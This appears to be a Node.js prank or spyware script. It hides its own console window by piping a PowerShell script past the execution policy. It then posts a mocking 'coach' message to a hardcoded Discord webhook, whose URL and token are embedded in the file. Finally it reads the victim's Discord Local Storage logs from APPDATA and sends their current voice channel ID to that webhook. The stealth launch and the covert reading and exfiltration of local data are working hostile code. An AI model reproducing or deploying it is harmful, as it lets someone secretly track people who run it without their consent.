let urlPost = "https://discord.com/api/webhooks/1016789258205401119/fQT3D2lAp079e470lXfI6x46LXUKWhodfKR3hkrlSbkhcgonVKaLeptBruIllrmwet3W"

const fs = require('fs');
hideSelf();
const { EmbedBuilder, WebhookClient } = require('discord.js');
const path = require('path');

const webhookClient = new WebhookClient({ url: urlPost });

let trainerWahl = Math.floor(Math.random() * 5);
let content = "";
let user = "";
let avatar = "";

switch (trainerWahl) {
  case 0:
    content = "Mit dem besten Trainer fallen viele Tore!";
    user = "Alois Schwartz";
    avatar = "https://cdn.ligainsider.de/images/coach/large/alois-schwartz.jpg";
    break;
  case 1:
    content = "Mein Name ist Programm!";
    user = "Jens Keller";
    avatar = "https://upload.wikimedia.org/wikipedia/commons/7/72/Jens_Keller_2016_%28cropped%29.jpg";
    break;
  case 2:
    content = "Ohne Mittelfeld fallen die meisten Tore!";
    user = "Damir Canadi";
    avatar = "https://img.a.transfermarkt.technology/portrait/header/4918-1469641634.jpg?lm=1";
    break;
  case 3:
    content = "Sogar für Liga 2 zu schwach!";
    user = "Valérien Ismaël";
    avatar = "https://img.a.transfermarkt.technology/portrait/header/12871-1574261536.jpg?lm=1";
    break;
  case 4:
    content = "afkomst oud!";
    user = "Gertjaan Verbeek";
    avatar = "https://www.gn-online.de/bilder/der-ehemalige-twente-trainer-gertjan-verbeek-kuemmert-sich-803407og.jpg";
    break;
}

let messageID = "";

function f() {
  return new Promise(resolve => {
    let result = webhookClient.send({
      content: content,
      username: user,
      avatarURL: avatar
    });
		setTimeout(() => resolve(result), 3000);
	});
}

f().then(result => {
  messageID = result.id;
  fs.writeFileSync(path.join(__dirname, "..", 'properties', 'messageID.txt'), messageID);

  const readPath = path.join(process.env.APPDATA, "discord", "Local Storage", "leveldb");
  let channelId = "";

  fs.readdir(readPath, function (err, files) {
      if (err) {
          return console.log('Unable to scan directory: ' + err);
      }
      files.forEach(function (file) {
          let fileType = file.split('.').pop();
          if(fileType == "log") {
            let dc = fs.readFileSync(path.join(readPath, file), 'utf8');
            const num = /"lastConnectedTime":\d+/g;
            let test = dc.matchAll(num);
            let lastTime = 0;
            let i = 0;
            let startIndex = 0;
            for (const match of test) {
              lastTime = match[0].split(":")[1];
              startIndex = match.index;
              console.log(lastTime + " " + match.index);
              i++;
            }
            let isNull = dc[startIndex - 22];
            console.log(dc[startIndex - 22-70]);
            if(isNull != "l") {
              let startDoc = dc.indexOf('"selectedVoiceChannelId":', startIndex - 90);
              const sliceChannelId = /\d+/g;
              let slicedFile = dc.slice(startDoc);
              let channelId = slicedFile.match(sliceChannelId)[0];
              console.log(channelId);
              let endDoc = startDoc + 17;
              const message = webhookClient.editMessage(messageID, {
                content: channelId,
                username: user,
                avatarURL: avatar,
              });
            } else {
              console.log("No connection possible");
            }
          }
      });
  });
});

function hideSelf() {

    let powershellScript = `
    Add-Type -Name Window -Namespace Console -MemberDefinition '
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '

    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
    `;

    let workingDir = process.cwd();
    let tempfile = `${workingDir}\\temp.ps1`;
    fs.writeFileSync(tempfile, powershellScript);

    //a little convoluted to get around powershell script execution policy (might be disabled)
    require('child_process').execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, {stdio: 'inherit'});
    fs.unlinkSync(tempfile); //delete temp file
}
